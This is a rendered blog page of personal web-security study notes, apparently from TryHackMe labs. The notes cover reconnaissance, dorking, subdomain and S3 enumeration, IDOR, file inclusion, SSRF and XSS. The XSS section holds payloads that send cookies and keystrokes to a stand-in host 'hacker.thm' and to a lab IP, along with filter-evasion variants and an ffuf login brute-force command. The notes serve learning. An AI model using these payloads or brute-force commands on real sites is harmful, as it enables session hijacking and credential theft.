@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/rainou/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=rainou/livereload" data-no-instant defer></script>
+  <title>
+  Network Website Services · Rain Notes
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Rain Ou">
+<meta name="description" content="
+  Web Notes
+  
+    
+    Link to heading
+  
+
+
+  Category
+  
+    
+    Link to heading
+  
+
+
+Identification and Authentication Failure: login brute force
+Broken access control
+
+Insecure Direct Object References (IDOR): if there are IMG_1003.JPG, then it may exist IMG_1002.JPG and IMG_1004.JPG
+
+
+Injection
+cryptographic failures
+
+
+  Tools
+  
+    
+    Link to heading
+  
+
+
+Website developper tools
+
+Page Source
+Inspector: see all html, css and js
+Debugger: check out happen at the specific time
+Network: open the window then refresh to get a network package
+
+
+
+
+  Knowldge
+  
+    
+    Link to heading
+  
+
+
+  Robots.txt
+  
+    
+    Link to heading
+  
+
+A document that tells the search engine what page they aren&rsquo;t allowed show or crawled by the web crawler">
+<meta name="keywords" content="notes,cybersecurity,music,share">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Network Website Services">
+  <meta name="twitter:description" content="Web Notes Link to heading Category Link to heading Identification and Authentication Failure: login brute force Broken access control Insecure Direct Object References (IDOR): if there are IMG_1003.JPG, then it may exist IMG_1002.JPG and IMG_1004.JPG Injection cryptographic failures Tools Link to heading Website developper tools Page Source Inspector: see all html, css and js Debugger: check out happen at the specific time Network: open the window then refresh to get a network package Knowldge Link to heading Robots.txt Link to heading A document that tells the search engine what page they aren’t allowed show or crawled by the web crawler">
+
+<meta property="og:url" content="http://localhost:1313/rainou/cyber/network-website-services/">
+  <meta property="og:site_name" content="Rain Notes">
+  <meta property="og:title" content="Network Website Services">
+  <meta property="og:description" content="Web Notes Link to heading Category Link to heading Identification and Authentication Failure: login brute force Broken access control Insecure Direct Object References (IDOR): if there are IMG_1003.JPG, then it may exist IMG_1002.JPG and IMG_1004.JPG Injection cryptographic failures Tools Link to heading Website developper tools Page Source Inspector: see all html, css and js Debugger: check out happen at the specific time Network: open the window then refresh to get a network package Knowldge Link to heading Robots.txt Link to heading A document that tells the search engine what page they aren’t allowed show or crawled by the web crawler">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cyber">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/rainou/cyber/network-website-services/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/rainou/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/rainou/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/rainou/">
+      Rain Notes
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/cyber/">Cyber</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/music/">Music</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/rainou/cyber/network-website-services/">
+          Network Website Services
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="web-notes">
+  Web Notes
+  <a class="heading-link" href="#web-notes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="category">
+  Category
+  <a class="heading-link" href="#category">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ol>
+<li>Identification and Authentication Failure: login brute force</li>
+<li>Broken access control
+<ul>
+<li>Insecure Direct Object References (<strong>IDOR</strong>): if there are IMG_1003.JPG, then it may exist IMG_1002.JPG and IMG_1004.JPG</li>
+</ul>
+</li>
+<li>Injection</li>
+<li>cryptographic failures</li>
+</ol>
+<h2 id="tools">
+  Tools
+  <a class="heading-link" href="#tools">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Website developper tools
+<ul>
+<li>Page Source</li>
+<li>Inspector: see all html, css and js</li>
+<li>Debugger: check out happen at the specific time</li>
+<li>Network: open the window then refresh to get a network package</li>
+</ul>
+</li>
+</ul>
+<h1 id="knowldge">
+  Knowldge
+  <a class="heading-link" href="#knowldge">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h3 id="robotstxt">
+  Robots.txt
+  <a class="heading-link" href="#robotstxt">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>A document that tells the search engine what page they aren&rsquo;t allowed show or crawled by the web crawler</p>
+<h3 id="favicon">
+  Favicon
+  <a class="heading-link" href="#favicon">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The small icon in the browser address tab bar used of branding
+Can be used to determine what framework was used
+<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database"  class="external-link" target="_blank" rel="noopener">OWASP favicon database</a>
+Use md5sum to check the favicon with the favicon database</p>
+<h3 id="sitemapxml">
+  sitemap.xml
+  <a class="heading-link" href="#sitemapxml">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>List every files on the website that wishes to be listed on search engine.
+Contains defficult to navigate pages
+contain link to the legacy pages</p>
+<h3 id="http-headers">
+  HTTP headers
+  <a class="heading-link" href="#http-headers">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The responses that the webserver reponds when making an request</p>
+<h3 id="framework-stack">
+  Framework Stack
+  <a class="heading-link" href="#framework-stack">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The framework (archtecture template) that the web server uses</p>
+<hr>
+<h1 id="notes-side-knowldege">
+  Notes Side Knowldege
+  <a class="heading-link" href="#notes-side-knowldege">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="crawlers">
+  Crawlers
+  <a class="heading-link" href="#crawlers">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>index the domain (stored in database)</li>
+<li>crawling: retrieve information (keywords/image) about the websites</li>
+</ul>
+<h3 id="keywords-listing">
+  Keywords listing
+  <a class="heading-link" href="#keywords-listing">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>
+<p>Discovery: Discover websites based on content and scrape the keywords
+<img src="1.png" alt="Screenshot 2023-03-18 at 4.12.39 PM.png"></p>
+</li>
+<li>
+<p>Spider web: using the URL from previous crawled websites
+<img src="2.png" alt="Screenshot 2023-03-18 at 4.16.19 PM.png"></p>
+<ul>
+<li>Intent to traverse URL obtained from the discovery</li>
+</ul>
+</li>
+<li>
+<p>The crawler have already indexed all website for keywod searching</p>
+</li>
+<li>
+<p>When user search of a keyword, all website contains a specific keywords get displayed</p>
+</li>
+</ul>
+<h3 id="website-hierarchy">
+  Website hierarchy
+  <a class="heading-link" href="#website-hierarchy">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>SEO (Search Engine Optimisation)</li>
+<li>businesses capitalise on improving a domains SEO “ranking”</li>
+<li>“prioritise” those domains that are easier to index</li>
+<li>point-scoring system: how “optimal” a domain is
+<ul>
+<li><strong>Responsiveness</strong>: how responsive to different browser type</li>
+<li><strong>Easiness</strong>: crawling&rsquo;s easiness through the use of &ldquo;Sitemaps&rdquo;</li>
+<li><strong>Related Keywords</strong> :kind of keywords</li>
+<li><strong>etc</strong>. Each browser has their own &ldquo;point-score&rdquo; system</li>
+</ul>
+</li>
+<li>Use several tools to analyse the SEO of a website
+<ul>
+<li><a href="https://web.dev/measure/"  class="external-link" target="_blank" rel="noopener">Google&rsquo;s Site Analyzer</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="crawler-regulation">
+  Crawler Regulation
+  <a class="heading-link" href="#crawler-regulation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Browser provides the crawler</li>
+<li>website/web-server owner can regular what can be crawled</li>
+<li><strong>Robots.txt</strong>: first thing indexted by crawler
+<ul>
+<li><strong>located in root directory</strong></li>
+<li>defines the permission the crawler has to the website</li>
+<li>Keyword:
+<ul>
+<li>User-agent: Type of crawler allowed (&rsquo;*&rsquo;: allow all user-agents)</li>
+<li>Allow: specify what can index</li>
+<li>disallow: specify what cannot index</li>
+<li>sitemap: reference to the sitemap</li>
+</ul>
+</li>
+<li>robots.txt can use <a href="https://www.rexegg.com/regex-quickstart.html"  class="external-link" target="_blank" rel="noopener">regexing</a></li>
+</ul>
+</li>
+<li><strong>Sitemaps</strong>:
+<ul>
+<li>&ldquo;geographical maps in real life&rdquo;, but for websites</li>
+<li>route to find content</li>
+<li><strong>located in the root directory</strong>
+<ul>
+<li>/sitemap.xml
+<ul>
+<li><a href="https://tryhackme.com/room/xxe"  class="external-link" target="_blank" rel="noopener">XML room</a> provides more details</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>holds a fair amount of weight in SEO optimization: <strong>A &lsquo;wordlist&rsquo; to the crawlers</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="google-dorking">
+  Google Dorking
+  <a class="heading-link" href="#google-dorking">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Google Search Engine has arbitrary usage
+<ul>
+<li>normal search</li>
+<li>use of functions
+<ul>
+<li>calculator</li>
+<li>little game</li>
+<li>etc</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>google dorking is the search through the operand function to search for specific items
+<ul>
+<li>e.g. intitle:index.of
+<ul>
+<li>this lists everything on a website in a directory pattern</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="osint">
+  OSINT
+  <a class="heading-link" href="#osint">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Open source intelligence
+External resouces that helps discovering the target websites</p>
+<h3 id="osint---google-hackingdorking">
+  OSINT - Google Hacking/Dorking
+  <a class="heading-link" href="#osint---google-hackingdorking">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Google dorking search technique <a href="https://en.wikipedia.org/wiki/Google_hacking"  class="external-link" target="_blank" rel="noopener">More</a></p>
+<table>
+  <thead>
+      <tr>
+          <th>filter</th>
+          <th>example</th>
+          <th>description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>site</td>
+          <td>site:tryhackme.com</td>
+          <td>returned result from specified address</td>
+      </tr>
+      <tr>
+          <td>inurl</td>
+          <td>inurl:admin</td>
+          <td>returned url with specified keyword</td>
+      </tr>
+      <tr>
+          <td>filetype</td>
+          <td>filetype:pdf</td>
+          <td>returned result with that file extension</td>
+      </tr>
+      <tr>
+          <td>intitle</td>
+          <td>intitle:admin</td>
+          <td>result that contain that specified word in title</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="osint---wappalyzer">
+  OSINT - Wappalyzer
+  <a class="heading-link" href="#osint---wappalyzer">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Identify the technology (framework, content management system, payment processor, etc) a certain website uses <a href="https://www.wappalyzer.com/"  class="external-link" target="_blank" rel="noopener">More</a></p>
+<h3 id="osint---wayback-machine">
+  OSINT - Wayback Machine
+  <a class="heading-link" href="#osint---wayback-machine">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>An Internet Archive: historical archive of the websites dates back to the late 90s. <a href="https://www.wappalyzer.com/"  class="external-link" target="_blank" rel="noopener">Website</a>
+Contain a copy of the website, this can be used to discover some of the link that are still active on the current website.</p>
+<h3 id="osint---github">
+  OSINT - Github
+  <a class="heading-link" href="#osint---github">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Version control system you all know too well for</p>
+<h3 id="osint---s3-buckets">
+  OSINT - S3 Buckets
+  <a class="heading-link" href="#osint---s3-buckets">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Cloud storage device provided by Amazon AWS
+Sometimes their files permission stored on the AWS are incorrectly set
+Access link:
+http(s)://{name}.s3.amazonaws.com
+{name} is decided by owner
+e.g. tryhackme-assets.s3.amazonaws.com
+Discovered by</p>
+<ul>
+<li>finding the link from the website sources pages</li>
+<li>github repositories</li>
+<li>automating the process (the guessing prosess)
+Most commum name to be automated: {name}-assets, {name}-www, {name}-public, {name}-private, etc.</li>
+</ul>
+<h3 id="osint---automated-directory">
+  OSINT - Automated Directory
+  <a class="heading-link" href="#osint---automated-directory">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Using tools and wordlist to discover the unknown directory that are not listed publicly anywhere
+pre-existed wordlist path: <a href="https://github.com/danielmiessler/SecLists"  class="external-link" target="_blank" rel="noopener">Word list git source</a>
+The command for this action:</p>
+<pre tabindex="0"><code>fuff /* messy UI result, clear progress*/
+dirb /* better UI, show directory path separately */
+gobuster /* clean, show all path with a simple output */
+</code></pre><h3 id="osint---sublist3r">
+  OSINT - Sublist3r
+  <a class="heading-link" href="#osint---sublist3r">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Speed up the DNS brute force attack using sublist3r.py script/tool</p>
+<h3 id="subdomain-enumeration">
+  Subdomain Enumeration
+  <a class="heading-link" href="#subdomain-enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Process of finding valid subdomain for a domain
+Discover attack surface and find more vulnerability</p>
+<ul>
+<li>brute force</li>
+<li>OSINT</li>
+<li>Virtual Host</li>
+</ul>
+<h2 id="ssltls">
+  SSL/TLS
+  <a class="heading-link" href="#ssltls">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Secure Sockets Layer/Transport Layer Security certificate</p>
+<ul>
+<li>Created for domain by CA (certificate authority)</li>
+<li>CA take part in &ldquo;Certificate Transparency (CT) logs&rdquo;</li>
+<li>CT are publicly acessible log for every SSL/TLS certificate created for a domain name</li>
+<li>CT stops the bad certificate from being used
+Enter the domain name in the area to search for domain and historical certificate</li>
+<li><a href="https://crt.sh"  class="external-link" target="_blank" rel="noopener">site1 crt.sh</a></li>
+<li><a href="https://ui.ctsearch.entrust.com/ui/ctsearchui"  class="external-link" target="_blank" rel="noopener">site2 ct search</a></li>
+</ul>
+<h1 id="website-commun-vulnerability">
+  Website Commun Vulnerability
+  <a class="heading-link" href="#website-commun-vulnerability">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="dns-brute-force">
+  DNS Brute force
+  <a class="heading-link" href="#dns-brute-force">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Use tools to guess or enumerate of different possible subdomains and feed to the DNS server</p>
+<pre tabindex="0"><code>dnsrecon
+</code></pre><h2 id="virtual-hosts">
+  Virtual Hosts
+  <a class="heading-link" href="#virtual-hosts">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Subdomain may not be completely publicly accessible, the address translation can be a private process on a <strong>hosts header</strong> (request side). (hosts file for windows) This is a local DNS file translate from sensitive sub-domain name to the IP address
+use fuff to launch this enumeration</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &#34;Host: FUZZ.acmeitsupport.thm&#34; -u http://10.10.1.117 -fs {size}
+</code></pre><h2 id="authentication-bypass">
+  Authentication bypass
+  <a class="heading-link" href="#authentication-bypass">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Username enumeration: find a way to discover their username</li>
+<li>Brute Force: try a bunch of password with those username
+example bruteforce using ffuf</li>
+</ul>
+<pre tabindex="0"><code>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &#34;username=W1&amp;password=W2&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://10.10.49.36/customers/login -fc 200
+</code></pre><ul>
+<li>Logic flaw: Jump intended path to get access to something
+e.g. the code checks for the exact match of &ldquo;/admin&rdquo;, &ldquo;adMin&rdquo; is not checked and can be present to them</li>
+<li>Cookie Tampering
+<ul>
+<li>Clear text cookie info</li>
+<li>Hash cookie info
+<ul>
+<li>Hash not reversible for security reasons</li>
+</ul>
+</li>
+<li>Encoding
+<ul>
+<li>Encoding is reversible for transmition purpose</li>
+<li>Convert binary and human readable data</li>
+<li>Iin which the transmittion only supports plain text ASCII character</li>
+<li>Common encoding type: base32, base64</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>*Storage Cookies</li>
+</ul>
+<h2 id="idor">
+  IDOR
+  <a class="heading-link" href="#idor">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Insecure direct object reference
+guess the other file/user/document by replacing the similar number
+try tampering ID&rsquo;s with the following methods</p>
+<ul>
+<li>encoded id&rsquo;s using base64</li>
+<li>hashed id&rsquo;s using md45</li>
+<li>undeterminable ID: create two account and swap their &ldquo;ID&rdquo; number
+<ul>
+<li>if worked, then IDOR detected</li>
+</ul>
+</li>
+</ul>
+<p>They can be located in various places: AJAX request (developper tools &gt; network &gt; changing the AJAX some element request), reference JS file, endpoints, reference parameter during production, etc.</p>
+<h2 id="file-inclusion">
+  File inclusion
+  <a class="heading-link" href="#file-inclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Local File inclusion (LFI)</li>
+<li>Remote File inclusion (RFI): ask the server to execute something outside of its domain</li>
+<li>directory/path traversal
+<ul>
+<li>often caused by poor input validation/filitering when passing to a function such as file_get_contents in php</li>
+<li>go to another directory using ./../../etc</li>
+<li>injection techniques: %00 or 0x00 (Null Byte) is a user supplied data to terminate te string, ignore anything after the null byte
+<ul>
+<li>Not working anymore with PHP 5.3.4 and above</li>
+</ul>
+</li>
+<li>/etc/passwd/. by pass filters</li>
+<li>examine the error messages for what is missing</li>
+</ul>
+</li>
+</ul>
+<p>Sending post request to a server</p>
+<pre tabindex="0"><code>curl -v -H &#34;Content-Type: application/json&#34; -X POST -d &#39;{&#34;file&#34;:&#34;welcome.php&#34;}&#39; http://10.10.166.175/challenges/chall1.php
+</code></pre><h2 id="server-side-request-forgery-ssrf">
+  Server Side Request Forgery (SSRF)
+  <a class="heading-link" href="#server-side-request-forgery-ssrf">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Two type of SSRF vulnerability</p>
+<ol>
+<li>Data is returned to the attacker screen</li>
+<li>Blind SSRF vulnerability, no data is returned to the attacker screen
+In short: The user is making a request in a url/other_means for the server to request something they souldn&rsquo;t have requested</li>
+</ol>
+<ul>
+<li>Example:
+<ul>
+<li>forge the api request that server expect to receive</li>
+<li>forge the folder (using directory traversal) that server expect to receive</li>
+<li>forge the request to another website</li>
+</ul>
+</li>
+</ul>
+<p>*&amp;x= ignore the rest of the requested link</p>
+<ul>
+<li>Finding one
+<ul>
+<li>a nested URL in the address bar</li>
+<li>url in a form (from source page)</li>
+<li>partial url, e.g. just the hostname (&ldquo;server=api&rdquo;)</li>
+<li>the path of URL</li>
+</ul>
+</li>
+<li>*If working on blind SSRF, an external HTTP working tools will be helpful (<a href="/Applications/Joplin.app/Contents/Resources/app.asar/requestbin.com" title="requestbin.com" >requestbin</a>, HTTP server, Burp Suite&rsquo;s Collaborator Client)</li>
+</ul>
+<hr>
+<p>Defending SSRF
+Two common way</p>
+<ul>
+<li><strong>Deny List</strong>: restrict IP address in a localhost when specified
+<ul>
+<li>Cloud: best to deny 169.254.169.254 which contain metadata for the deployed server</li>
+<li>Bypass: e.g. registering a subdomain under 169.254.169.254</li>
+</ul>
+</li>
+<li><strong>Allow List</strong>: All list gets deny unless on the list
+<ul>
+<li>Bypass: e.g. registering a subdomain with the allowed doman address</li>
+</ul>
+</li>
+<li><strong>Open redirect</strong>: If the above method doesn&rsquo;t work, endpoint on the server automatically that gets redirected to another website address may be a vulnerable point to explore
+<ul>
+<li>e.g. <a href="https://website.thm/link?url=https://tryhackme.com"  class="external-link" target="_blank" rel="noopener">https://website.thm/link?url=https://tryhackme.com</a> is for recording the number visitor clicked, this is a potential vulnerable link for using as a point of SSRF</li>
+</ul>
+</li>
+</ul>
+<h2 id="cross-site-scripting-xss">
+  Cross-Site Scripting (XSS)
+  <a class="heading-link" href="#cross-site-scripting-xss">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>based on Javascript</li>
+<li>injection with malicious Javascript into a web application and executed by the others
+<ul>
+<li>create XSS payload</li>
+<li>modify payload to evade filters</li>
+</ul>
+</li>
+<li>XSS vulnerability extreamly common</li>
+<li><strong>Payload</strong>: JS code to be excecuted on the target computer, there are two part to the payload
+<ul>
+<li><strong>Intention</strong>: what we hope JS to actually do, below are some of the examples:
+<ul>
+<li>proof of concept: confirm a website is vulnerable to XSS <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></li>
+<li>Session Stealing: redirect the cookie information to an under-controlled server
+<code>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</code></li>
+<li>Key Logger: anything typed will be forwarded to an under-controlled server
+<code>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</code></li>
+<li>Business Logic: calling a particular network resources, e.g. changing the email addres to perform reset password attack
+<code>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><strong>Modification</strong>: the change of the code to make it execute (depends on every scenario)</li>
+</ul>
+</li>
+<li><strong>Reflected XSS (Client side)</strong>
+<ul>
+<li>Embedded malicious scripts within <strong>website source code</strong> and collect information upon user&rsquo;s click.</li>
+<li>e.g. Inserted script within source page.</li>
+<li>How to test: test every single entrypoint
+<ul>
+<li>Parameters in the URL Query String</li>
+<li>URL File Path</li>
+<li>HTTP Headers</li>
+<li>The idea is to find some <strong>data being reflected in the web</strong> application (in popup) and test if can <strong>run JS payload</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Stored XSS (server side)</strong>
+<ul>
+<li>XSS payload <strong>stored on the web application</strong>, gets executed when other users visit the site</li>
+<li>e.g. Payload with post comment, run when user visit the article</li>
+<li>How to test: test entry point where it might have data stored
+<ul>
+<li>comments on a blog</li>
+<li>profile information</li>
+<li>website listings</li>
+<li>Give an <strong>unexpected value to a field</strong> can detect if it has XSS vulnerability: sends the request instead using the dropdown menu they provided and test if can <strong>run JS payload</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>DOM Based XSS</strong>
+<ul>
+<li>Mostly imlement <code>&lt;script&gt;&lt;/script&gt;</code></li>
+<li>DOM (Document Object Model) programming interface for HTML and XML document. It can modify the page (whereas composed of many smaller object component). The <strong>page document</strong> can be represented in source code or HTML DOM diagram: <img src="3.png" alt="HTML DOM.png"> <a href="https://www.w3.org/TR/REC-DOM-Level-1/introduction.html"  class="external-link" target="_blank" rel="noopener">DOM resource w3.org</a></li>
+<li>DOM based XSS is where the JS execution involve directly with the browser
+<ul>
+<li>no page loaded</li>
+<li>no data submitted to backend code</li>
+<li>Execution occurs/acts on input ot user interaction</li>
+</ul>
+</li>
+<li>Gets the content from <code>window.location.hash</code> and write it to the page. .hash does not check malicious code, hence allowing the JS injection</li>
+<li>How to test:
+<ul>
+<li>require knowledge in JS to read source code</li>
+<li>look for code that have access certain variables to take control.
+such as <code>window.location.x</code> code</li>
+<li>see how they&rsquo;re handled, exploring if this part of the code has vulnerability
+<ul>
+<li>written to webpage DOM</li>
+<li>handled to unsafe JS function such as eval()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Blind XSS</strong>
+<ul>
+<li>Similar to Stored XSS, <strong>stored payload</strong>, but <strong>can&rsquo;t see the payload</strong> working or test it.</li>
+<li>e.g. Sending payload through contact form to an internal user.</li>
+<li>How to test:
+<ul>
+<li>Ensure payload has a call back (HTTP request)</li>
+<li>A popular tool to use <a href="https://xsshunter.com/#/"  class="external-link" target="_blank" rel="noopener">xsshunter</a>
+<ul>
+<li>captures cookies URLs, page contents, etc.</li>
+<li>possible to make your own tools</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>About JS payload</strong>
+<ul>
+<li>JS ignores <code>&lt;/&gt;</code></li>
+<li><code>&lt;script&gt;alert('THM');&lt;/script&gt;</code></li>
+<li><code>&quot;&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code> closing the previous value</li>
+<li><code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code> closing the previous tag, the <code>&lt;/textarea&gt;</code> that is left will be ignored, additional closing tag gets deleted</li>
+<li><code>';alert('THM');//</code> closing the previous and comment the rest</li>
+<li><code>&lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt;</code> when &ldquo;script&rdquo; is getting filtered</li>
+<li><code>/images/cat.jpg&quot; onload=&quot;alert('THM');</code> use onload when &lt;&gt; gets filtered</li>
+<li>Example payload provided: <code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.70.131?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code>
+<ul>
+<li>fetch(): commands makes an HTTP requests</li>
+<li>the http is the request catcher</li>
+<li><code>?cookie=</code> query cookies string</li>
+<li><code>btoa()</code> command base64 to encode the victim&rsquo;s cookie</li>
+<li><code>document.cookie</code> access victim cookie for the website</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="injection">
+  Injection
+  <a class="heading-link" href="#injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
